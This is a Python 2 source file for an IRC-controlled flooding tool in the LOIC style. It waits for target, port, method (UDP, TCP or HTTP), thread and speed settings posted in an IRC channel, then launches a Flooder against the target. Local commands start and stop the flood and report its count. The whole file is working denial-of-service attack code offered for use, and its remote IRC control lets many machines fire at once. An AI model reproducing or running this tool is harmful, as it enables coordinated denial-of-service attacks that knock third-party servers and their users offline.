import sys, socket, string, random, os, time
from Events import *
from IRC import * 
from Flooder import *

NEED_INFO = 0
WAITING = 1
START = 2

UDP_METHOD = 0
TCP_METHOD = 1
HTTP_METHOD = 2

status = NEED_INFO
flooder = None

targetip = None
targethost = None
timeout = None
subsite = None
message = None
port = None
method = TCP_METHOD
threads = 1
wait = None
random = None
speed = None


def lazerParseHook(event):
    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed
    print event.arg

    s = []
    for x in event.arg:
        t = x.split('=')
        if len(t) > 1:
            for y in t:
                s.append(y)
        else:
            if t[0] == "start":
                status = START
            elif t[0] == "default": #needs to be fleshed out more
                timeout = 9001
                subsite = "/"
                port = 80
                message = "U dun goofed"
                method = TCP_METHOD
                speed = 0
                random = False

    print "Splitting finished, status:", status

    for x in range(0, len(s), 2):
        if s[x] == "targetip":
            targetip = s[x+1]
        elif s[x] == "targethost":
            targethost = s[x+1]
        elif s[x] == "timeout":
            if s[x+1].isdigit():
                timeout = int(s[x+1])
                if(timeout < -1):
                    timeout = None
        elif s[x] == "subsite":
            subsite = s[x+1]
        elif s[x] == "message":
            message = s[x+1]
        elif s[x] == "port":
            if s[x+1].isdigit():
                port = int(s[x+1])
                if port > 65535:
                    port = None
                elif port < 1:
                    port = None
        elif s[x] == "method":
            method = s[x+1]
            if method == "UDP":
                method = UDP_METHOD
            elif method == "HTTP":
                method = HTTP_METHOD
            else:
                method = TCP_METHOD
        elif s[x] == "threads":
            if s[x+1].isdigit():
                threads = int(s[x+1])
                if threads > 100:
                    threads = 100
                elif threads < 1:
                    threads = 1
        elif s[x] == "wait":
            wait = s[x+1]
            if wait.lower() == "true":
                wait = True
            else:
                wait = False
        elif s[x] == "random":
            random = s[x+1]
            if random.lower() == "true":
                random = True
            else:
                random = None
        elif s[x] == "speed":
            if s[x+1].isdigit():
                speed = int(s[x+1])
                if speed > 20:
                    speed = 20
                elif speed < 1:
                    speed = 1

    print "parsing finished"

    if status == START:
        event = Event(START_LAZER, None)
        getEventManager().signalEvent(event)
    else:
        status = WAITING

def lazerStartHook(event):
    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed
    print "FIRING MAH LAZ000000R!"
    if status == START:
        if flooder != None:
            flooder.stop()

        if (targetip == None and targethost == None) or port == None:
            print "no target set"
            return

        if timeout == None:
            print "Missing required timeout"
            return
        if method == None:
            print "Missing required method"
            return
        if threads == None:
            print "Missing required thread amount"
            return

        host = None
        if targetip == None:
            host = targethost
        else:
            host = targetip

        flooder = Flooder(host, port, timeout, method, threads, subsite, message, random, wait)
        flooder.start()

irc = None
running = True
def restartIRCHook(event):
    global irc

    time.sleep(5)
    irc.connect()

def main(args):
    global irc, flooder

    listener = Listener(LAZER_RECV, lazerParseHook)
    getEventManager().addListener(listener)
    listener = Listener(START_LAZER, lazerStartHook)
    getEventManager().addListener(listener)
    listener = Listener(IRC_RESTART, restartIRCHook)
    getEventManager().addListener(listener)

    host = args[1]
    port = int(args[2])
    channel = args[3]
    if channel[0] != '#':
        channel = '#' + channel

    getEventManager().start()

    irc = IRC(host, port, channel)

    while running:
        i = raw_input()
        if i.find("connect") == 0:
            info = i.split(" ")
            print info
            if len(info) == 4 and info[2].isdigit():
                newhost = info[1]
                newport = int(info[2])
                newchannel = info[3]
                if newhost == host and newport == port and irc.connected:
                    print "changing channel to", newchannel
                    irc.changeChannel(newchannel)
                    channel = newchannel
                else:
                    host = newhost
                    port = newport
                    channel = newchannel
                    print "changing host to", host, port, channel
                    irc.disconnect()
                    irc.host = host
                    irc.port = port
                    irc.channel = channel
                    irc.connect()
            else:
                print "not enough info. connect server port channel"
        elif i == "stopflood":
            if flooder:
                flooder.stop()
        elif i == "startflood":
            if flooder:
                flooder.start()
        elif i == "floodcount":
            if flooder:
                print flooder.floodCount()
        elif i == "quit" or i == "exit":
            irc.disconnect()
            if flooder:
                flooder.stop()
            getEventManager().stop()
            break

    time.sleep(1)
    sys.exit()


if __name__ == '__main__':
    main(sys.argv)
